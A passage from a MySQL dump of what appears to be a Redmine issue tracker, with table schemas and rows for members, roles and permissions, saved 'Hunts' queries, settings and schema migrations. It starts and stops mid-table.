18:19:31',0),(353,141,'Issue',1,'','2021-05-06 18:21:26',0),(354,169,'Issue',1,'','2021-05-06 18:22:04',0),(355,170,'Issue',1,'','2021-05-06 18:22:04',0),(356,146,'Issue',1,'','2021-05-06 18:22:13',0),(357,141,'Issue',1,'','2021-05-06 18:22:50',0),(358,141,'Issue',1,'','2021-05-06 18:23:13',0),(359,141,'Issue',1,'','2021-05-06 18:23:49',0),(360,149,'Issue',1,'','2021-05-06 18:24:21',0),(361,141,'Issue',1,'','2021-05-06 18:24:50',0),(362,149,'Issue',1,'','2021-05-06 18:25:04',0),(363,170,'Issue',1,'','2021-05-06 18:25:32',0),(364,171,'Issue',1,'','2021-05-06 18:25:32',0),(365,136,'Issue',1,'','2021-05-06 18:25:59',0),(366,160,'Issue',1,'','2021-05-06 18:26:55',0),(367,135,'Issue',1,'','2021-05-06 18:28:18',0),(368,138,'Issue',1,'','2021-05-06 18:30:02',0),(369,75,'Issue',1,'','2021-05-06 18:30:34',0),(370,139,'Issue',1,'','2021-05-06 18:31:37',0),(371,123,'Issue',1,'','2021-05-06 18:32:38',0),(372,125,'Issue',1,'','2021-05-06 18:33:28',0),(373,168,'Issue',1,'','2021-05-06 18:35:02',0),(374,77,'Issue',1,'','2021-05-06 18:37:04',0),(375,77,'Issue',1,'','2021-05-06 18:37:28',0),(376,94,'Issue',1,'','2021-05-06 18:37:35',0),(377,95,'Issue',1,'','2021-05-06 18:38:26',0),(378,96,'Issue',1,'','2021-05-06 18:39:03',0),(379,97,'Issue',1,'','2021-05-06 18:39:45',0),(380,98,'Issue',1,'','2021-05-06 18:40:34',0),(381,99,'Issue',1,'','2021-05-06 18:41:17',0),(382,100,'Issue',1,'','2021-05-06 18:42:07',0),(383,59,'Issue',1,'','2021-05-06 18:45:03',0);
/*!40000 ALTER TABLE `journals` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `member_roles`
--

DROP TABLE IF EXISTS `member_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `member_roles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `member_id` int(11) NOT NULL,
  `role_id` int(11) NOT NULL,
  `inherited_from` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_member_roles_on_member_id` (`member_id`),
  KEY `index_member_roles_on_role_id` (`role_id`),
  KEY `index_member_roles_on_inherited_from` (`inherited_from`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `member_roles`
--

LOCK TABLES `member_roles` WRITE;
/*!40000 ALTER TABLE `member_roles` DISABLE KEYS */;
INSERT INTO `member_roles` VALUES (1,1,3,NULL),(2,2,3,1),(3,3,3,1),(4,4,3,1),(5,5,4,NULL),(6,6,4,5),(7,7,4,5),(8,8,4,5),(9,9,4,5),(10,10,3,1),(11,11,3,1);
/*!40000 ALTER TABLE `member_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `members`
--

DROP TABLE IF EXISTS `members`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `members` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `project_id` int(11) NOT NULL DEFAULT '0',
  `created_on` timestamp NULL DEFAULT NULL,
  `mail_notification` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `index_members_on_user_id_and_project_id` (`user_id`,`project_id`),
  KEY `index_members_on_user_id` (`user_id`),
  KEY `index_members_on_project_id` (`project_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `members`
--

LOCK TABLES `members` WRITE;
/*!40000 ALTER TABLE `members` DISABLE KEYS */;
INSERT INTO `members` VALUES (1,7,1,'2021-01-27 15:17:12',0),(2,1,1,'2021-01-27 15:17:12',0),(3,5,1,'2021-01-27 15:17:12',0),(4,6,1,'2021-01-27 15:17:12',0),(5,8,1,'2021-01-27 15:17:30',0),(6,10,1,'2021-01-28 14:55:19',0),(7,11,1,'2021-01-28 14:55:19',0),(8,13,1,'2021-01-28 14:55:19',0),(9,14,1,'2021-01-28 14:55:19',0),(10,9,1,'2021-01-28 14:56:08',0),(11,12,1,'2021-01-28 14:56:08',0);
/*!40000 ALTER TABLE `members` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `board_id` int(11) NOT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `subject` varchar(255) NOT NULL DEFAULT '',
  `content` text,
  `author_id` int(11) DEFAULT NULL,
  `replies_count` int(11) NOT NULL DEFAULT '0',
  `last_reply_id` int(11) DEFAULT NULL,
  `created_on` datetime NOT NULL,
  `updated_on` datetime NOT NULL,
  `locked` tinyint(1) DEFAULT '0',
  `sticky` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `messages_board_id` (`board_id`),
  KEY `messages_parent_id` (`parent_id`),
  KEY `index_messages_on_last_reply_id` (`last_reply_id`),
  KEY `index_messages_on_author_id` (`author_id`),
  KEY `index_messages_on_created_on` (`created_on`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `news`
--

DROP TABLE IF EXISTS `news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `news` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) DEFAULT NULL,
  `title` varchar(60) NOT NULL DEFAULT '',
  `summary` varchar(255) DEFAULT '',
  `description` text,
  `author_id` int(11) NOT NULL DEFAULT '0',
  `created_on` timestamp NULL DEFAULT NULL,
  `comments_count` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `news_project_id` (`project_id`),
  KEY `index_news_on_author_id` (`author_id`),
  KEY `index_news_on_created_on` (`created_on`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `news`
--

LOCK TABLES `news` WRITE;
/*!40000 ALTER TABLE `news` DISABLE KEYS */;
/*!40000 ALTER TABLE `news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `open_id_authentication_associations`
--

DROP TABLE IF EXISTS `open_id_authentication_associations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `open_id_authentication_associations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `issued` int(11) DEFAULT NULL,
  `lifetime` int(11) DEFAULT NULL,
  `handle` varchar(255) DEFAULT NULL,
  `assoc_type` varchar(255) DEFAULT NULL,
  `server_url` blob,
  `secret` blob,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `open_id_authentication_associations`
--

LOCK TABLES `open_id_authentication_associations` WRITE;
/*!40000 ALTER TABLE `open_id_authentication_associations` DISABLE KEYS */;
/*!40000 ALTER TABLE `open_id_authentication_associations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `open_id_authentication_nonces`
--

DROP TABLE IF EXISTS `open_id_authentication_nonces`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `open_id_authentication_nonces` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `timestamp` int(11) NOT NULL,
  `server_url` varchar(255) DEFAULT NULL,
  `salt` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `open_id_authentication_nonces`
--

LOCK TABLES `open_id_authentication_nonces` WRITE;
/*!40000 ALTER TABLE `open_id_authentication_nonces` DISABLE KEYS */;
/*!40000 ALTER TABLE `open_id_authentication_nonces` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `projects`
--

DROP TABLE IF EXISTS `projects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `projects` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `description` text,
  `homepage` varchar(255) DEFAULT '',
  `is_public` tinyint(1) NOT NULL DEFAULT '1',
  `parent_id` int(11) DEFAULT NULL,
  `created_on` timestamp NULL DEFAULT NULL,
  `updated_on` timestamp NULL DEFAULT NULL,
  `identifier` varchar(255) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `lft` int(11) DEFAULT NULL,
  `rgt` int(11) DEFAULT NULL,
  `inherit_members` tinyint(1) NOT NULL DEFAULT '0',
  `default_version_id` int(11) DEFAULT NULL,
  `default_assigned_to_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_projects_on_lft` (`lft`),
  KEY `index_projects_on_rgt` (`rgt`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `projects`
--

LOCK TABLES `projects` WRITE;
/*!40000 ALTER TABLE `projects` DISABLE KEYS */;
INSERT INTO `projects` VALUES (1,'Change Me','CHANGE ME','',0,NULL,'2021-01-27 15:04:02','2021-05-13 17:59:25','change-name',1,1,2,0,NULL,NULL);
/*!40000 ALTER TABLE `projects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `projects_trackers`
--

DROP TABLE IF EXISTS `projects_trackers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `projects_trackers` (
  `project_id` int(11) NOT NULL DEFAULT '0',
  `tracker_id` int(11) NOT NULL DEFAULT '0',
  UNIQUE KEY `projects_trackers_unique` (`project_id`,`tracker_id`),
  KEY `projects_trackers_project_id` (`project_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `projects_trackers`
--

LOCK TABLES `projects_trackers` WRITE;
/*!40000 ALTER TABLE `projects_trackers` DISABLE KEYS */;
INSERT INTO `projects_trackers` VALUES (1,1),(1,2),(1,3),(1,4),(1,5);
/*!40000 ALTER TABLE `projects_trackers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `queries`
--

DROP TABLE IF EXISTS `queries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `queries` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) DEFAULT NULL,
  `name` varchar(255) NOT NULL DEFAULT '',
  `filters` text,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `column_names` text,
  `sort_criteria` text,
  `group_by` varchar(255) DEFAULT NULL,
  `type` varchar(255) DEFAULT NULL,
  `visibility` int(11) DEFAULT '0',
  `options` text,
  PRIMARY KEY (`id`),
  KEY `index_queries_on_project_id` (`project_id`),
  KEY `index_queries_on_user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `queries`
--

LOCK TABLES `queries` WRITE;
/*!40000 ALTER TABLE `queries` DISABLE KEYS */;
INSERT INTO `queries` VALUES (3,NULL,'Hunts Clean View','---\nstatus_id:\n  :operator: o\n  :values:\n  - \'\'\ntracker_id:\n  :operator: \"=\"\n  :values:\n  - \'5\'\n',1,NULL,'---\n- - parent\n  - desc\n- - id\n  - desc\n','','IssueQuery',2,'---\n:totalable_names: []\n:display_type: list\n:draw_relations: \n:draw_progress_line: \n:draw_selected_columns: \n'),(4,1,'Hunts Detailed View','---\nstatus_id:\n  :operator: o\n  :values:\n  - \'\'\ntracker_id:\n  :operator: \"=\"\n  :values:\n  - \'5\'\n',1,'---\n- :last_notes\n- :tracker\n- :status\n- :priority\n- :subject\n- :assigned_to\n- :updated_on\n- :parent\n','---\n- - parent\n  - desc\n- - id\n  - desc\n','','IssueQuery',2,'---\n:totalable_names: []\n:display_type: list\n:draw_relations: \n:draw_progress_line: \n:draw_selected_columns: \n'),(5,1,'Hunts Description Information VIew Thingy','---\nstatus_id:\n  :operator: o\n  :values:\n  - \'\'\ntracker_id:\n  :operator: \"=\"\n  :values:\n  - \'5\'\n',1,'---\n- :description\n- :tracker\n- :status\n- :priority\n- :subject\n- :assigned_to\n- :updated_on\n- :parent\n','---\n- - parent\n  - desc\n- - id\n  - desc\n','','IssueQuery',2,'---\n:totalable_names: []\n:display_type: list\n:draw_relations: \n:draw_progress_line: \n:draw_selected_columns: \n');
/*!40000 ALTER TABLE `queries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `queries_roles`
--

DROP TABLE IF EXISTS `queries_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `queries_roles` (
  `query_id` int(11) NOT NULL,
  `role_id` int(11) NOT NULL,
  UNIQUE KEY `queries_roles_ids` (`query_id`,`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `queries_roles`
--

LOCK TABLES `queries_roles` WRITE;
/*!40000 ALTER TABLE `queries_roles` DISABLE KEYS */;
/*!40000 ALTER TABLE `queries_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `repositories`
--

DROP TABLE IF EXISTS `repositories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `repositories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL DEFAULT '0',
  `url` varchar(255) NOT NULL DEFAULT '',
  `login` varchar(60) DEFAULT '',
  `password` varchar(255) DEFAULT '',
  `root_url` varchar(255) DEFAULT '',
  `type` varchar(255) DEFAULT NULL,
  `path_encoding` varchar(64) DEFAULT NULL,
  `log_encoding` varchar(64) DEFAULT NULL,
  `extra_info` longtext,
  `identifier` varchar(255) DEFAULT NULL,
  `is_default` tinyint(1) DEFAULT '0',
  `created_on` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_repositories_on_project_id` (`project_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `repositories`
--

LOCK TABLES `repositories` WRITE;
/*!40000 ALTER TABLE `repositories` DISABLE KEYS */;
/*!40000 ALTER TABLE `repositories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles`
--

DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `roles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `position` int(11) DEFAULT NULL,
  `assignable` tinyint(1) DEFAULT '1',
  `builtin` int(11) NOT NULL DEFAULT '0',
  `permissions` text,
  `issues_visibility` varchar(30) NOT NULL DEFAULT 'default',
  `users_visibility` varchar(30) NOT NULL DEFAULT 'all',
  `time_entries_visibility` varchar(30) NOT NULL DEFAULT 'all',
  `all_roles_managed` tinyint(1) NOT NULL DEFAULT '1',
  `settings` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles`
--

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES (1,'Non member',0,1,1,'---\n- :view_issues\n- :view_news\n- :view_messages\n','default','all','all',1,NULL),(2,'Anonymous',0,1,2,'---\n- :view_issues\n- :view_news\n- :view_messages\n','default','all','all',1,NULL),(3,'admin',1,1,0,'---\n- :add_project\n- :edit_project\n- :close_project\n- :select_project_modules\n- :manage_members\n- :manage_versions\n- :add_subprojects\n- :manage_public_queries\n- :save_queries\n- :view_messages\n- :add_messages\n- :edit_own_messages\n- :manage_boards\n- :view_calendar\n- :view_documents\n- :add_documents\n- :edit_documents\n- :delete_documents\n- :view_files\n- :manage_files\n- :view_gantt\n- :view_issues\n- :add_issues\n- :edit_issues\n- :edit_own_issues\n- :copy_issues\n- :manage_issue_relations\n- :manage_subtasks\n- :set_own_issues_private\n- :add_issue_notes\n- :edit_own_issue_notes\n- :set_notes_private\n- :view_issue_watchers\n- :add_issue_watchers\n- :delete_issue_watchers\n- :import_issues\n- :manage_categories\n- :view_news\n- :manage_news\n- :comment_news\n- :view_changesets\n- :browse_repository\n- :commit_access\n- :manage_related_issues\n- :manage_repository\n- :view_time_entries\n- :log_time\n- :edit_own_time_entries\n- :log_time_for_other_users\n- :import_time_entries\n- :view_wiki_pages\n- :view_wiki_edits\n- :export_wiki_pages\n- :edit_wiki_pages\n- :rename_wiki_pages\n- :delete_wiki_pages\n- :delete_wiki_pages_attachments\n- :protect_wiki_pages\n- :manage_wiki\n','default','all','all',1,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\npermissions_all_trackers: !ruby/hash:ActiveSupport::HashWithIndifferentAccess\n  view_issues: \'1\'\n  add_issues: \'1\'\n  edit_issues: \'1\'\n  add_issue_notes: \'1\'\n  delete_issues: \'1\'\npermissions_tracker_ids: !ruby/hash:ActiveSupport::HashWithIndifferentAccess\n  view_issues: []\n  add_issues: []\n  edit_issues: []\n  add_issue_notes: []\n  delete_issues: []\n'),(4,'operator',2,1,0,'---\n- :view_messages\n- :add_messages\n- :edit_own_messages\n- :view_calendar\n- :view_documents\n- :add_documents\n- :edit_documents\n- :view_files\n- :manage_files\n- :view_gantt\n- :view_issues\n- :add_issues\n- :edit_own_issues\n- :copy_issues\n- :manage_issue_relations\n- :manage_subtasks\n- :add_issue_notes\n- :edit_own_issue_notes\n- :view_issue_watchers\n- :add_issue_watchers\n- :delete_issue_watchers\n- :import_issues\n- :manage_categories\n- :view_news\n- :comment_news\n- :view_changesets\n- :browse_repository\n- :commit_access\n- :view_time_entries\n- :log_time\n- :edit_own_time_entries\n- :view_wiki_pages\n- :view_wiki_edits\n- :export_wiki_pages\n- :edit_wiki_pages\n- :protect_wiki_pages\n','default','all','all',1,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\npermissions_all_trackers: !ruby/hash:ActiveSupport::HashWithIndifferentAccess\n  view_issues: \'1\'\n  add_issues: \'1\'\n  edit_issues: \'1\'\n  add_issue_notes: \'1\'\n  delete_issues: \'1\'\npermissions_tracker_ids: !ruby/hash:ActiveSupport::HashWithIndifferentAccess\n  view_issues: []\n  add_issues: []\n  edit_issues: []\n  add_issue_notes: []\n  delete_issues: []\n');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles_managed_roles`
--

DROP TABLE IF EXISTS `roles_managed_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `roles_managed_roles` (
  `role_id` int(11) NOT NULL,
  `managed_role_id` int(11) NOT NULL,
  UNIQUE KEY `index_roles_managed_roles_on_role_id_and_managed_role_id` (`role_id`,`managed_role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles_managed_roles`
--

LOCK TABLES `roles_managed_roles` WRITE;
/*!40000 ALTER TABLE `roles_managed_roles` DISABLE KEYS */;
/*!40000 ALTER TABLE `roles_managed_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `schema_migrations`
--

DROP TABLE IF EXISTS `schema_migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `schema_migrations` (
  `version` varchar(255) NOT NULL,
  PRIMARY KEY (`version`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `schema_migrations`
--

LOCK TABLES `schema_migrations` WRITE;
/*!40000 ALTER TABLE `schema_migrations` DISABLE KEYS */;
INSERT INTO `schema_migrations` VALUES ('1'),('10'),('100'),('101'),('102'),('103'),('104'),('105'),('106'),('107'),('108'),('11'),('12'),('13'),('14'),('15'),('16'),('17'),('18'),('19'),('2'),('20'),('20090214190337'),('20090312172426'),('20090312194159'),('20090318181151'),('20090323224724'),('20090401221305'),('20090401231134'),('20090403001910'),('20090406161854'),('20090425161243'),('20090503121501'),('20090503121505'),('20090503121510'),('20090614091200'),('20090704172350'),('20090704172355'),('20090704172358'),('20091010093521'),('20091017212227'),('20091017212457'),('20091017212644'),('20091017212938'),('20091017213027'),('20091017213113'),('20091017213151'),('20091017213228'),('20091017213257'),('20091017213332'),('20091017213444'),('20091017213536'),('20091017213642'),('20091017213716'),('20091017213757'),('20091017213835'),('20091017213910'),('20091017214015'),('20091017214107'),('20091017214136'),('20091017214236'),('20091017214308'),('20091017214336'),('20091017214406'),('20091017214440'),('20091017214519'),('20091017214611'),('20091017214644'),('20091017214720'),('20091017214750'),('20091025163651'),('20091108092559'),('20091114105931'),('20091123212029'),('20091205124427'),('20091220183509'),('20091220183727'),('20091220184736'),('20091225164732'),('20091227112908'),('20100129193402'),('20100129193813'),('20100221100219'),('20100313132032'),('20100313171051'),('20100705164950'),('20100819172912'),('20101104182107'),('20101107130441'),('20101114115114'),('20101114115359'),('20110220160626'),('20110223180944'),('20110223180953'),('20110224000000'),('20110226120112'),('20110226120132'),('20110227125750'),('20110228000000'),('20110228000100'),('20110401192910'),('20110408103312'),('20110412065600'),('20110511000000'),('20110902000000'),('20111201201315'),('20120115143024'),('20120115143100'),('20120115143126'),('20120127174243'),('20120205111326'),('20120223110929'),('20120301153455'),('20120422150750'),('20120705074331'),('20120707064544'),('20120714122000'),('20120714122100'),('20120714122200'),('20120731164049'),('20120930112914'),('20121026002032'),('20121026003537'),('20121209123234'),('20121209123358'),('20121213084931'),('20130110122628'),('20130201184705'),('20130202090625'),('20130207175206'),('20130207181455'),('20130215073721'),('20130215111127'),('20130215111141'),('20130217094251'),('20130602092539'),('20130710182539'),('20130713104233'),('20130713111657'),('20130729070143'),('20130911193200'),('20131004113137'),('20131005100610'),('20131124175346'),('20131210180802'),('20131214094309'),('20131215104612'),('20131218183023'),('20140228130325'),('20140903143914'),('20140920094058'),('20141029181752'),('20141029181824'),('20141109112308'),('20141122124142'),('20150113194759'),('20150113211532'),('20150113213922'),('20150113213955'),('20150208105930'),('20150510083747'),('20150525103953'),('20150526183158'),('20150528084820'),('20150528092912'),('20150528093249'),('20150725112753'),('20150730122707'),('20150730122735'),('20150921204850'),('20150921210243'),('20151020182334'),('20151020182731'),('20151021184614'),('20151021185456'),('20151021190616'),('20151024082034'),('20151025072118'),('20151031095005'),('20160404080304'),('20160416072926'),('20160529063352'),('20161001122012'),('20161002133421'),('20161010081301'),('20161010081528'),('20161010081600'),('20161126094932'),('20161220091118'),('20170207050700'),('20170302015225'),('20170309214320'),('20170320051650'),('20170418090031'),('20170419144536'),('20170723112801'),('20180501132547'),('20180913072918'),('20180923082945'),('20180923091603'),('20190315094151'),('20190315102101'),('20190510070108'),('20190620135549'),('21'),('22'),('23'),('24'),('25'),('26'),('27'),('28'),('29'),('3'),('30'),('31'),('32'),('33'),('34'),('35'),('36'),('37'),('38'),('39'),('4'),('40'),('41'),('42'),('43'),('44'),('45'),('46'),('47'),('48'),('49'),('5'),('50'),('51'),('52'),('53'),('54'),('55'),('56'),('57'),('58'),('59'),('6'),('60'),('61'),('62'),('63'),('64'),('65'),('66'),('67'),('68'),('69'),('7'),('70'),('71'),('72'),('73'),('74'),('75'),('76'),('77'),('78'),('79'),('8'),('80'),('81'),('82'),('83'),('84'),('85'),('86'),('87'),('88'),('89'),('9'),('90'),('91'),('92'),('93'),('94'),('95'),('96'),('97'),('98'),('99');
/*!40000 ALTER TABLE `schema_migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `value` text,
  `updated_on` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_settings_on_name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=34 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settings`
--

LOCK TABLES `settings` WRITE;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
INSERT INTO `settings` VALUES (1,'app_title','Change Me','2021-04-16 15:30:30'),(2,'welcome_text','','2021-04-16 15:30:30'),(3,'per_page_options','25,50,100','2021-01-27 14:57:36'),(4,'search_results_per_page','10','2021-01-27 14:57:36'),(5,'activity_days_default','30','2021-01-27 14:57:36'),(6,'host_name','localhost:3000','2021-01-27 14:57:36'),(7,'protocol','http','2021-01-27 14:57:36'),(8,'text_formatting','textile','2021-01-27 14:57:36'),(9,'cache_formatted_text','0','2021-01-27 14:57:36'),(10,'wiki_compression','','2021-01-27 14:57:36'),(11,'feeds_limit','15','2021-01-27 14:57:36'),(12,'cross_project_issue_relations','0','2021-01-27 16:52:35'),(13,'link_copied_issue','ask','2021-01-27 16:52:35'),(14,'cross_project_subtasks','tree','2021-01-27 16:52:35'),(15,'close_duplicate_issues','1','2021-01-27 16:52:35'),(16,'issue_group_assignment','0','2021-01-27 16:52:35'),(17,'default_issue_start_date_to_creation_date','1','2021-01-27 16:52:35'),(18,'display_subprojects_issues','1','2021-01-27 16:52:35'),(19,'issue_done_ratio','issue_field','2021-01-27 16:52:35'),(20,'non_working_week_days','---\n- \'6\'\n- \'7\'\n','2021-01-27 16:52:35'),(21,'issues_export_limit','500','2021-01-27 16:52:35'),(22,'gantt_items_limit','500','2021-01-27 16:52:35'),(23,'gantt_months_limit','24','2021-01-27 16:52:35'),(24,'parent_issue_dates','derived','2021-01-27 16:52:35'),(25,'parent_issue_priority','independent','2021-01-27 18:21:25'),(26,'parent_issue_done_ratio','derived','2021-01-27 16:52:35'),(27,'issue_list_default_columns','---\n- tracker\n- status\n- priority\n- subject\n- assigned_to\n- updated_on\n- parent\n','2021-01-27 16:52:35'),(28,'issue_list_default_totals','--- []\n','2021-01-27 16:52:35'),(29,'default_projects_public','0','2021-04-16 15:30:51'),(30,'default_projects_modules','---\n- issue_tracking\n- documents\n- files\n','2021-05-13 17:58:24'),(31,'default_projects_tracker_ids','--- []\n','2021-04-16 15:30:51'),(32,'sequential_project_identifiers','0','2021-04-16 15:30:51'),(33,'project_list_defaults','---\n:column_names:\n- name\n- identifier\n- short_description\n','2021-04-16 15:30:51');
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `time_entries`
--

DROP TABLE IF EXISTS `time_entries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `time_entries` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL,
  `author_id` int(11) DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `issue_id` int(11) DEFAULT NULL,
  `hours` float NOT NULL,
  `comments` varchar(1024) DEFAULT NULL,
  `activity_id` int(11) NOT NULL,
  `spent_on` date NOT NULL,
  `tyear` int(11) NOT NULL,
  `tmonth` int(11) NOT NULL,
  `tweek` int(11) NOT NULL,
  `created_on` datetime NOT NULL,
  `updated_on` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `time_entries_project_id` (`project_id`),
  KEY `time_entries_issue_id` (`issue_id`),
  KEY `index_time_entries_on_activity_id` (`activity_id`),
  KEY `index_time_entries_on_user_id` (`user_id`),
  KEY `index_time_entries_on_created_on` (`created_on`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `time_entries`
--

LOCK TABLES `time_entries` WRITE;
/*!40000 ALTER TABLE `time_entries` DISABLE KEYS */;
/*!40000 ALTER TABLE `time_entries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tokens`
--

DROP TABLE IF EXISTS `tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tokens` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `action` varchar(30) NOT NULL DEFAULT '',
  `value` varchar(40) NOT NULL DEFAULT '',
  `created_on` datetime NOT NULL,
  `updated_on` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
